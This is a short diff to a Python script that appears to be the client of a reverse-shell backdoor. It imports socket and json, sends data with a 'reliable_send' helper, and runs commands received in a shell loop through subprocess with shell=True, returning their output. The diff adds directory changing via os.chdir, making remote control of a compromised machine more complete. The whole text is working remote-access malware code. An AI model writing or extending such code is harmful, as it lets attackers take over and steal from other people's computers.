@@ -1,6 +1,7 @@
 import socket 
 import json
 import subprocess
+import os
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -24,6 +25,8 @@ def shell():
             pass
         elif command == 'clear':
             pass
+        elif command[:3] == 'cd ':
+            os.chdir(command[3:])
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
